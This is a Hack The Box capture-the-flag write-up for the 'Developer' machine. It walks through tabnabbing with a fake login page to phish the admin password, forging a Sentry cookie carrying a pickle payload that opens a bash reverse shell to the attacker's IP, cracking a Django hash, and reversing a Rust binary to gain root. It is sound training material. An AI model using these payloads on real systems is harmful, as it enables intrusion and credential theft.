---
title:     "Hack The Box - Developer"
tags: [linux,hard,xss,tab nabbing,csrf,sentry,django,pickle,deserialization,hashcat,reversing,ida,rust,sudo]
categories: HackTheBox
---
[![info_card](/img/developer/info_card.png)](/img/developer/info_card.png)

Developer is a hard rated machine on HackTheBox created by [TheCyberGeek](https://www.hackthebox.eu/home/users/profile/114053). For the user part we will exploit a XSS vulnerability in a writeup submission form on a CTF platform. The application is vulnerable to tabnabbing which let's us phish the admin's password and discover another vhost in the django administration interface. Debugging is enabled in the sentry application on this vhost. Triggering a server error we are able to retrieve the secret to sign our own cookie leading to RCE and a reverse shell as it gets deserialized. We find some database credentials and crack a hash giving us access as the user karl. Karl may run a custom authenticator binary as root. Reversing it we are able to retrieve the password it needs and write our public ssh key to root's authorized keys.

# User

## Nmap

As usual we start our enumeration off with a nmap scan against all ports, followed by a script and version detection scan against the open ones to get an initial overview of the attack surface.

`All ports`
```
$ sudo nmap -p- -T4 10.129.190.110
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-23 14:39 GMT
Nmap scan report for developer.htb (10.129.190.110)
Host is up (0.070s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 128.78 seconds
```

`Script and version`
```
$ sudo nmap -sC -sV -p22,80 10.129.190.110
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-23 17:45 GMT
Nmap scan report for 10.129.190.110
Host is up (0.033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA)
|   256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA)
|_  256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://developer.htb/
Service Info: Host: developer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.16 seconds
```

## XSS => CSRF

There are only two ports open on the machine with http being a bigger attack surface so we will start there. The nmap scan already revealed the name of a vhost so we add it to our `/etc/hosts` and open it in our browser. At a first glance it looks like a CTF platform.

[![dev_home](/img/developer/dev_home.png)](/img/developer/dev_home.png)

Running a quick gobuster scan on the website it looks like everything containing the string `admin` get's redirected.

```
$ gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-large-words.txt -u http://developer.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://developer.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/23 17:52:49 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 0] [--> /admin/]
/wp-admin             (Status: 301) [Size: 0] [--> /wp-admin/]
/media                (Status: 301) [Size: 314] [--> http://developer.htb/media/]
/contact              (Status: 301) [Size: 0] [--> /contact/]
/profile              (Status: 301) [Size: 0] [--> /profile/]
/static               (Status: 301) [Size: 315] [--> http://developer.htb/static/]
/.                    (Status: 200) [Size: 10877]
/fileadmin            (Status: 301) [Size: 0] [--> /fileadmin/]
/phpmyadmin           (Status: 301) [Size: 0] [--> /phpmyadmin/]
/_admin               (Status: 301) [Size: 0] [--> /_admin/]
/siteadmin            (Status: 301) [Size: 0] [--> /siteadmin/]
/topicadmin           (Status: 301) [Size: 0] [--> /topicadmin/]
/dashboard            (Status: 301) [Size: 0] [--> /dashboard/]
/Polls_admin          (Status: 301) [Size: 0] [--> /Polls_admin/]
/Taxonomy_admin       (Status: 301) [Size: 0] [--> /Taxonomy_admin/]
/webadmin             (Status: 301) [Size: 0] [--> /webadmin/]
/myadmin              (Status: 301) [Size: 0] [--> /myadmin/]
/map_admin            (Status: 301) [Size: 0] [--> /map_admin/]
/vsadmin              (Status: 301) [Size: 0] [--> /vsadmin/]
/podcasts_admin       (Status: 301) [Size: 0] [--> /podcasts_admin/]
...[snip]...
```

Clicking on the menu we can sign up, which we do since it might unlock additional functionality.

[![dev_menu](/img/developer/dev_menu.png)](/img/developer/dev_menu.png)

Being logged in there are three different machine categories and five challenge categories.

[![dev_platform](/img/developer/dev_platform.png)](/img/developer/dev_platform.png)

The machine categories lead nowhere but there are some challenges for everything but `Web`.

### Phished List

[![dev_forensics](/img/developer/dev_forensics.png)](/img/developer/dev_forensics.png)

Downloading a forensics challenge we can take a quick look for the flag to check for more potentially vulnerable functioniality after submitting it. The zip file contains a xlsx which is just a zip itself so we open it aswell.

```
$ unzip phished_list.zip
Archive:  phished_list.zip
  inflating: phished_credentials.xlsx
```

```
$ unzip phished_credentials.xlsx
Archive:  phished_credentials.xlsx
  inflating: [Content_Types].xml
  inflating: _rels/.rels
  inflating: xl/workbook.xml
  inflating: xl/_rels/workbook.xml.rels
  inflating: xl/worksheets/sheet1.xml
  inflating: xl/theme/theme1.xml
  inflating: xl/styles.xml
  inflating: xl/sharedStrings.xml
  inflating: docProps/thumbnail.wmf
  inflating: xl/worksheets/_rels/sheet1.xml.rels
  inflating: docProps/core.xml
  inflating: docProps/app.xml
```

Checking for low hanging fruits we get the flag with a quick `grep` command for a common flag scheme.

```
grep -iRe '{.*}'
...[snip]...
ased tertiary definition</t></si><si><t>admin@developer.htb</t></si><si><t>DHTB{H1dD3N_C0LuMn5_FtW}</t></si></sst>
```

After submitting the flag we are now able to also submit a writeup for the challenge and are prompted with the url. We enter our own ip and stand up a `ncat` listener to see if there is something checking the writeup.

[![sub_walkthrough](/img/developer/sub_walkthrough.png)](/img/developer/sub_walkthrough.png)

Going to our profile we see that we now have a walkthrough submited. Checking the source of the page for the link we see that clicking on it opens a new tab with `target="_blank"`. This makes it susceptible to tabnabbing since we can change the parent page of the tab.

[![walktrough_profile](/img/developer/walktrough_profile.png)](/img/developer/walktrough_profile.png)

[![target_blank](/img/developer/target_blank.png)](/img/developer/target_blank.png)

After about a minute we get a hit on our listener with the user agent of firefox, which means it is probably checked using a browser.

```
$ sudo nc -lnvp 80
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.129.190.110.
Ncat: Connection from 10.129.190.110:53674.
GET / HTTP/1.1
Host: 10.10.14.73
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

To abuse the tabnabbing we have to put a javascript payload as writeup url which modifies the parent tab.

```js
window.opener.parent.location.replace('http://10.10.14.73:8000');
```

```
$ echo "javascript:eval(atob(\"$(cat tabnab | base64 -w0)\"))"
javascript:eval(atob("d2luZG93Lm9wZW5lci5wYXJlbnQubG9jYXRpb24ucmVwbGFjZSgnaHR0cDovLzEwLjEwLjE0LjczOjgwMDAnKTsK"))
```

Now we need to figure out what we want to display back on the initial tab. The most promising for this would be the login page because the user might think he got logged out and just log in again to a fake page hosted by us. This way we might be able to steal his credentials and log in as him.

For this we download the login page and replace the relative resource links with absolute ones to not break any functionality.

```
$ curl http://developer.htb/accounts/login/ > index.html
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1938  100  1938    0     0  21065      0 --:--:-- --:--:-- --:--:-- 21065
```

`index.html`
```html






<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="http://developer.htb/img/favicon.ico">
    <link rel="stylesheet" href="http://developer.htb/static/css/jquery.toasts.css">
    <script src="http://developer.htb/static/js/all.min.js"></script>
    <script src="http://developer.htb/static/js/jquery-3.2.1.min.js"></script>
    <title>Login | Developer.HTB</title>

    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="http://developer.htb/static/css/bootstrap.min.css">

    <!-- Custom styles for this template -->
    <link href="http://developer.htb/static/css/signin.css" rel="stylesheet">
  </head>

  <body class="text-center">

    <form class="form-signin" action="http://10.10.14.73/whatever" method="post">
    	<input type="hidden" name="csrfmiddlewaretoken" value="jJGTGHSi1clutWreOE4fOtN4XYfSIPDKVDCu14ofdxueV4fNSWKfWoBfOOTQjNIA">
      <img class="mb-4" src="http://developer.htb/static/img/logo.png" alt="" width="72" height="72">
      <h1 class="h3 mb-3 font-weight-normal">Welcome back!</h1>
      <label for="uname" class="sr-only">User Name</label>
      <input type="text" id="id_login" name="login" placeholder="Username" class="form-control" required autofocus>
      <label for="password" class="sr-only">Password</label>
      <input type="password" id="id_password" name="password" placeholder="Password" class="form-control" required>


      <button id="loginbtn" class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
          <a href="http://developer.htb/accounts/password/reset/" class="auth-link">Forgot password?</a>
		<div class="text-center mt-4 font-weight-light"> Don't have an account? <a href="http://developer.htb/accounts/signup/" >Click here!</a>
      <p class="mt-5 mb-3 text-muted">&copy; Developer.HTB 2021</p>
    </form>

<script src="http://developer.htb/static/js/jquery.toast.js"></script>
<script>


</script>
  </body>
</html>




```

Next we host the page with a python web server and also stand up a `ncat` listener to retrieve the request made by the user.

```
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
$ sudo nc -klnvp 80
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
```

Now we can send our javascript payload as walkthrough submission.

[![tabnabbing_payload](/img/developer/tabnabbing_payload.png)](/img/developer/tabnabbing_payload.png)

After about a minute later we get a hit on our python webserver followed by a hit on our `ncat` listener with the credentials for the admin user `admin:SuperSecurePassword@HTB2021`

```
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.190.110 - - [23/Aug/2021 16:00:02] "GET / HTTP/1.1" 200 -
```

```
$ sudo nc -klnvp 80
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.129.190.110.
Ncat: Connection from 10.129.190.110:59184.
POST /whatever HTTP/1.1
Host: 10.10.14.73
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Origin: http://10.10.14.73:8000
Connection: keep-alive
Referer: http://10.10.14.73:8000/
Upgrade-Insecure-Requests: 1

csrfmiddlewaretoken=jJGTGHSi1clutWreOE4fOtN4XYfSIPDKVDCu14ofdxueV4fNSWKfWoBfOOTQjNIA&login=admin&password=SuperSecurePassword%40HTB2021
```

We can now sign in as admin and browse to the django administration.

[![admin_django](/img/developer/admin_django.png)](/img/developer/admin_django.png)

Going over to sites there is an additional vhost which we also add to our `/etc/hosts`.

[![django_sites](/img/developer/django_sites.png)](/img/developer/django_sites.png)

## Sentry cookie deserialization

Browsing to it reveals a sentry installation which also let's us register a new user.

[![sentry_home](/img/developer/sentry_home.png)](/img/developer/sentry_home.png)

Creating a new user and logging in we have very low privileges. We can however list all members with their email addresses.

[![sentry_registered](/img/developer/sentry_registered.png)](/img/developer/sentry_registered.png)

There is a user named jacob which is also the name of the admin on the django administration page.

[![sentry_members](/img/developer/sentry_members.png)](/img/developer/sentry_members.png)

Testing his email with the earlier found password we are able to log into sentry with the credentials: `jacob@developer.htb:SuperSecurePassword@HTB2021`.

[![sentry_create](/img/developer/sentry_create.png)](/img/developer/sentry_create.png)

Looking around we are now able to create projects. Playing around with the functionality, it results in a server error trying to delete it and a stack trace because debugging mode is enabled in django.

[![remove_stacktrace](/img/developer/remove_stacktrace.png)](/img/developer/remove_stacktrace.png)

This stacktrace contains alot of information which might be of use to us. Since it is a django application we should be able to obtain RCE if we can sign our own cookie containing a serialized pickle payload. We aren't able to retrieve the django secret for this but [this](https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/) blogpost describing a very similar vulnerability in a sentry application outlines another possible way. Sentry also has a `system.secret-key` which basically overrides the django secret-key. Looking through the stacktrace this key is indeed present along other information about the sentry installation.

[![sentry_options_cookie](/img/developer/sentry_options_cookie.png)](/img/developer/sentry_options_cookie.png)

```
SENTRY_OPTIONS 	

{'cache.backend': 'sentry.cache.redis.RedisCache',
 'cache.options': {},
 'redis.options': {'hosts': {0: {'host': '127.0.0.1',
                                 'password': 'g7dRAO6BjTXMtP3iXGJjrSkz2H9Zhm0CAp2BnXE8h92AOWsPZ2zvtAapzrP8sqPR92aWN9DA207XmUTe',
                                 'port': 6379}}},
 'system.databases': {'default': {'ATOMIC_REQUESTS': False,
                                  'AUTOCOMMIT': True,
                                  'CONN_MAX_AGE': 0,
                                  'ENGINE': 'sentry.db.postgres',
                                  'HOST': 'localhost',
                                  'NAME': 'sentry',
                                  'OPTIONS': {},
                                  'PASSWORD': u'********************',
                                  'PORT': '',
                                  'TEST_CHARSET': None,
                                  'TEST_COLLATION': None,
                                  'TEST_MIRROR': None,
                                  'TEST_NAME': None,
                                  'TIME_ZONE': 'UTC',
                                  'USER': 'sentry'}},
 'system.debug': True,
 'system.secret-key': 'c7f3a64aa184b7cbb1a7cbe9cd544913'}
```

For the script to work we just have to replace the cookie and secret with our own `sentrysid` and `system.secret-key` respectivly. For the payload we use a simple bash reverse shell in the reduce function which later gets deserialized and executed in the process.

```py
#!/usr/bin/python
import django.core.signing, django.contrib.sessions.serializers
from django.http import HttpResponse
import cPickle
import os

SECRET_KEY='c7f3a64aa184b7cbb1a7cbe9cd544913'
#Initial cookie I had on sentry when trying to reset a password
cookie = '.eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQpVGlRGVZX6GKWVOAZFcAEFSlKLS5Lz87MzU8FayvOLslNTQnnjE0tLMuJLi1OL4jNTvFlDhZAEkhKTs1PzUkKVIObrlZZk5hTrgeT1XHMTM3McgSwniJpSPQD8nTQS:1mICU7:B0bJ3SQW8FyLGLk_RdABzO3OAI4'
newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
class PickleRce(object):
    def __reduce__(self):
        return (os.system,("bash -c 'bash -i >& /dev/tcp/10.10.14.73/7575 0>&1'",))
newContent['testcookie'] = PickleRce()

print(django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True))
```

We can now generate our own cookie and stand up a `ncat` listener on the port we specified.

```
$ python2 gencookie.py
.eJxrYKotZNQI5UxMLsksS80vSo9gY2BgKE7NKymqDGUpLk3Jj-ABClQaVEZVlfoYpZU4BkVwAQVKUotLkvPzszNTkwvyizMruIori0tSc7kKmUKNkxKLMxR0kxXUIYxMBTs1Bf2U1DL9kuQCfUMDPRAy0TM31jc3NTdVMLBTM1QvZG4tZAkqZA0Vik8sLcmILy1OLYpPSkzOTs1LCVWCOEevtCQzp1gPJK_nmpuYmeMIZDlB1fAi6ctM8WYt1QMAoJ9Fjw:1mICXn:S0Seo3ZC1wnYuHak2EoDCwmI3CU
```

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
```

After exchanging our previous `sentrysid` with the new cookie and refreshing the page we get a shell back, which we upgrade with python and fix the terminal size.

```
$ nc -lnvp 7575
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::7575
Ncat: Listening on 0.0.0.0:7575
Ncat: Connection from 10.129.190.110.
Ncat: Connection from 10.129.190.110:56332.
bash: cannot set terminal process group (978): Inappropriate ioctl for device
bash: no job control in this shell
www-data@developer:/var/sentry$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<try$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@developer:/var/sentry$ export TERM=xterm
export TERM=xterm
www-data@developer:/var/sentry$ ^Z
[1]+  Stopped                 nc -lnvp 7575
$ stty raw -echo;fg
nc -lnvp 7575

www-data@developer:/var/sentry$ stty rows 55 cols 236
```

Looking around on the file system the database credentials for the sentry application are in `/etc/sentry/sentry.conf.py`.

```
www-data@developer:/var/sentry$ cat /etc/sentry/
config.yml      sentry.conf.py
www-data@developer:/var/sentry$ cat /etc/sentry/sentry.conf.py

# This file is just Python, with a touch of Django which means
# you can inherit and tweak settings to your hearts content.
from sentry.conf.server import *

import os.path

CONF_ROOT = os.path.dirname(__file__)

DATABASES = {
    'default': {
        'ENGINE': 'sentry.db.postgres',
        'NAME': 'sentry',
        'USER': 'sentry',
        'PASSWORD': 'SentryPassword2021',
        'HOST': 'localhost',
        'PORT': '',
    }
}
...[snip]...
```

With this credentials we can now connect to the database with `psql` and list all the tables.

```
www-data@developer:/var/sentry$ psql sentry sentry -h localhost -W
Password for user sentry:
psql (9.6.22)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

sentry=#
```

```
sentry=# \d+
```

```
 Schema |                   Name                   |   Type   | Owner  |    Size    | Description
--------+------------------------------------------+----------+--------+------------+-------------
 public | auth_group                               | table    | sentry | 0 bytes    |
 public | auth_group_id_seq                        | sequence | sentry | 8192 bytes |
 public | auth_group_permissions                   | table    | sentry | 0 bytes    |
 public | auth_group_permissions_id_seq            | sequence | sentry | 8192 bytes |
 public | auth_permission                          | table    | sentry | 40 kB      |
 public | auth_permission_id_seq                   | sequence | sentry | 8192 bytes |
 public | auth_user                                | table    | sentry | 16 kB      |
 public | auth_user_id_seq                         | sequence | sentry | 8192 bytes |
 public | django_admin_log                         | table    | sentry | 8192 bytes |
 public | django_admin_log_id_seq                  | sequence | sentry | 8192 bytes |
 public | django_content_type                      | table    | sentry | 8192 bytes |
 public | django_content_type_id_seq               | sequence | sentry | 8192 bytes |
 public | django_session                           | table    | sentry | 8192 bytes |
 public | django_site                              | table    | sentry | 8192 bytes |
 public | django_site_id_seq                       | sequence | sentry | 8192 bytes |
 public | nodestore_node                           | table    | sentry | 88 kB      |
 public | sentry_activity                          | table    | sentry | 8192 bytes |
 public | sentry_activity_id_seq                   | sequence | sentry | 8192 bytes |
 public | sentry_apikey                            | table    | sentry | 8192 bytes |
 public | sentry_apikey_id_seq                     | sequence | sentry | 8192 bytes |
 public | sentry_auditlogentry                     | table    | sentry | 16 kB      |
 public | sentry_auditlogentry_id_seq              | sequence | sentry | 8192 bytes |
 public | sentry_authidentity                      | table    | sentry | 8192 bytes |
 public | sentry_authidentity_id_seq               | sequence | sentry | 8192 bytes |
 public | sentry_authprovider                      | table    | sentry | 8192 bytes |
 public | sentry_authprovider_default_teams        | table    | sentry | 0 bytes    |
 public | sentry_authprovider_default_teams_id_seq | sequence | sentry | 8192 bytes |
 public | sentry_authprovider_id_seq               | sequence | sentry | 8192 bytes |
 public | sentry_broadcast                         | table    | sentry | 8192 bytes |
 public | sentry_broadcast_id_seq                  | sequence | sentry | 8192 bytes |
 public | sentry_broadcastseen                     | table    | sentry | 0 bytes    |
 public | sentry_broadcastseen_id_seq              | sequence | sentry | 8192 bytes |
 public | sentry_eventmapping                      | table    | sentry | 8192 bytes |
 public | sentry_eventmapping_id_seq               | sequence | sentry | 8192 bytes |
 public | sentry_eventuser                         | table    | sentry | 16 kB      |
 public | sentry_eventuser_id_seq                  | sequence | sentry | 8192 bytes |
 public | sentry_file                              | table    | sentry | 8192 bytes |
 public | sentry_file_id_seq                       | sequence | sentry | 8192 bytes |
 public | sentry_fileblob                          | table    | sentry | 8192 bytes |
 public | sentry_fileblob_id_seq                   | sequence | sentry | 8192 bytes |
 public | sentry_fileblobindex                     | table    | sentry | 0 bytes    |
 public | sentry_fileblobindex_id_seq              | sequence | sentry | 8192 bytes |
 public | sentry_filterkey                         | table    | sentry | 0 bytes    |
 public | sentry_filterkey_id_seq                  | sequence | sentry | 8192 bytes |
 public | sentry_filtervalue                       | table    | sentry | 8192 bytes |
 public | sentry_filtervalue_id_seq                | sequence | sentry | 8192 bytes |
 public | sentry_groupasignee                      | table    | sentry | 0 bytes    |
 public | sentry_groupasignee_id_seq               | sequence | sentry | 8192 bytes |
 public | sentry_groupbookmark                     | table    | sentry | 0 bytes    |
 public | sentry_groupbookmark_id_seq              | sequence | sentry | 8192 bytes |
 public | sentry_groupedmessage                    | table    | sentry | 16 kB      |
 ```

The `auth_user` table contains all the password hashes for the users, which we can retrieve with the next query.

```
sentry=# select * from auth_user;
```

```
                                   password                                    |          last_login           | id |      username       |  first_name  |        email        | is_staff | is_active | is_superuser |          date_joined          | is_managed
-------------------------------------------------------------------------------+-------------------------------+----+---------------------+--------------+---------------------+----------+-----------+--------------+-------------------------------+------------
 pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI= | 2021-05-22 21:17:53.080994+00 |  1 | karl@developer.htb  | Karl Travis  | karl@developer.htb  | t        | t         | t            | 2021-05-22 16:56:29.249263+00 | f
 pbkdf2_sha256$12000$lnh1EhfYWKmi$2DMz83pfxCggRR7Gd8OPBmJGAw2bFigsPgfmAhHjT/s= | 2021-08-23 15:48:26.46281+00  |  6 | a@a.com             |              | a@a.com             | f        | t         | f            | 2021-08-22 20:47:04.461973+00 | f
 pbkdf2_sha256$12000$MqrMlEjmKEQD$MeYgWqZffc6tBixWGwXX2NTf/0jIG42ofI+W3vcUKts= | 2021-08-23 16:07:39.448152+00 |  5 | jacob@developer.htb | Jacob Taylor | jacob@developer.htb | t        | t         | t            | 2021-05-22 18:53:09.750524+00 | f
 ```

Since karl is the admin and also a user on the machine we try to crack his password hash with hashcat first and are successful.

```
$ hashcat -m 10000 -O  hash rockyou.txt
hashcat (v6.2.3) starting
...[snip]...
pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+mgRb8ZL8othIs32aGmqahx1rGI=:insaneclownposse

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Django (PBKDF2-SHA256)
Hash.Target......: pbkdf2_sha256$12000$wP0L4ePlxSjD$TTeyAB7uJ9uQprnr+m...x1rGI=
Time.Started.....: Mon Aug 23 15:25:52 2021 (3 secs)
Time.Estimated...: Mon Aug 23 15:25:55 2021 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    48696 H/s (8.86ms) @ Accel:16 Loops:32 Thr:1024 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 163840/14344388 (1.14%)
Rejected.........: 0/163840 (0.00%)
Restore.Point....: 0/14344388 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:11968-11999
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> 250100
Hardware.Mon.#1..: Temp: 53c Fan: 33% Util:100% Core:1974MHz Mem:4006MHz Bus:16

Started: Mon Aug 23 15:25:51 2021
Stopped: Mon Aug 23 15:25:57 2021
```

Now we can log in as karl and add the user flag to our collection.

```
$ ssh karl@developer.htb
karl@developer.htb's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 23 Aug 16:17:42 UTC 2021

  System load:           0.05
  Usage of /:            77.6% of 5.84GB
  Memory usage:          51%
  Swap usage:            11%
  Processes:             264
  Users logged in:       2
  IPv4 address for eth0: 10.129.190.110
  IPv6 address for eth0: dead:beef::250:56ff:feb9:a856


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Aug 23 08:04:00 2021 from 10.10.14.73
karl@developer:~$ wc -c user.txt
33 user.txt
```

# Root

## Rust reversing
Looking at sudo permissions karl is able to run the custom `/root/.auth/authenticator` binary as the root user.

```
karl@developer:~$ sudo -l
[sudo] password for karl:
Matching Defaults entries for karl on developer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karl may run the following commands on developer:
    (ALL : ALL) /root/.auth/authenticator
```

```
karl@developer:~$ file /root/.auth/authenticator
/root/.auth/authenticator: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dec8c0adbc231a7465e5df021c1f9e6695fe6a2f, for GNU/Linux 3.2.0, with debug_info, not stripped
```

Testing it, it asks for a password and exits if the wrong one is entered.

```
karl@developer:~$ sudo /root/.auth/authenticator
Welcome to TheCyberGeek's super secure login portal!
Enter your password to access the super user:
dasfdsfds
You entered a wrong password!
```

To take a close look at it we copy it over to our machine and open it in ida free.

```
$ scp karl@developer.htb:/root/.auth/authenticator .
karl@developer.htb's password:
authenticator
```

Looking at the decompiled output of the main function (F5) we see it calls another function.

[![ida_main](/img/developer/ida_main.png)](/img/developer/ida_main.png)

Taking a look at this one we see it calls the `crypto::aes::ctr` module with two arguments. According to the documentation the first argument here is the key and the second one the IV. These two values are defined above in the function and we can go to the definition by clicking on them.

[![aes_ctr](/img/developer/aes_ctr.png)](/img/developer/aes_ctr.png)

[![key_iv_aes](/img/developer/key_iv_aes.png)](/img/developer/key_iv_aes.png)

Further down there is one main if statement which seems to compare the aes encrypted input with the expected encrypted password. We can also find the encrypted string defined above again composed of two variables.

[![aes_cipher](/img/developer/aes_cipher.png)](/img/developer/aes_cipher.png)

[![aes_cipher_value](/img/developer/aes_cipher_value.png)](/img/developer/aes_cipher_value.png)

With all the values needed we just need to enter them into cyberchef, swapping the endianness for all of them and switching the mode to CTR to decrypt the password.

[![cyberchef_decrypt](/img/developer/cyberchef_decrypt.png)](/img/developer/cyberchef_decrypt.png)

```
https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'a3e832345c7991619e20d43dbef4f5d5'%7D,%7B'option':'Hex','string':'761f59e3d9d2959aa79855dc0620816a'%7D,'CTR','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=ZmUxYjI1ZjA4MDZhOTdjYTc4ODBmZDU4ZmM1YzIwMjM2Y2EyZGJkMGU1MDJiNWZhZWJjMGFmM2E5ZjI3MTUyYw
```

Running the binary again it seems our password is correct and it prompts us for our ssh key.

```
karl@developer:~$ sudo /root/.auth/authenticator
[sudo] password for karl:
Welcome to TheCyberGeek's super secure login portal!
Enter your password to access the super user:
RustForSecurity@Developer@2021:)
You have successfully authenticated
Enter your SSH public key in now:
```

We generate a new one, paste the public key and get told we are now able to authenticate as root.

```
$ ssh-keygen -f root
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in root
Your public key has been saved in root.pub
The key fingerprint is:
SHA256:7ekEKUM9JTqCdUedo7YDvyeUuXgmz9To611rA9+wuew jack@parrot
The key's randomart image is:
+---[RSA 3072]----+
|    . ..+...     |
|   o . + o+      |
|  . . + o. .     |
|     o..o+       |
|      o+S+.      |
|       oB=...    |
|       oo+=o.=   |
|      o+*+.o*..  |
|       **+ooEo   |
+----[SHA256]-----+
```

```
$ cat root.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBVAyTfSW+5B/A8CKn+kLk2foFEJQF3kMoateAAnUQvKkeKVAfzua35kBdvXGPZg9wOoIw1CAUt6m+VV6CG9eBeiXj+I8xlXDj5LkihywJcFgGtN1Ye9RK0ESir07icwpDhi6vkjomml2CeM2ZJxZQvBEBOeJeD/Cz9KPbWcIls4qJuBqlsch/FmaQwpAG5HH4HGA3d8F6UnDt+Y00UP3WRIQsT5MFtknjucebLFaHoDzL6v+pZcVO83IaDn+NxPI1UKx+lq7giHNqnxpxWLasbJdIYOwKBRpOn3ecUmUsu/R7wnIqP1XCl0y+pr88PlDf5McdcXIfZsaAl4HJkgIrY20UtD5ZIGuZO5qmUMzUjyGReFxtueAniiYcjq16W9hy/JIofXgOi8sTjy6iXV1goHoS6zKthv4xkU9/ASDWaL918qlrELvQ0Ki65H3ymlIlG7+XLwoLRYNxBswlECMDTkQfRJXPaCP1XubDOXxTFXwJrsTD75w9qGhUuEziZ1s= jack@parrot
```

```
karl@developer:~$ sudo /root/.auth/authenticator
[sudo] password for karl:
Welcome to TheCyberGeek's super secure login portal!
Enter your password to access the super user:
RustForSecurity@Developer@2021:)
You have successfully authenticated
Enter your SSH public key in now:
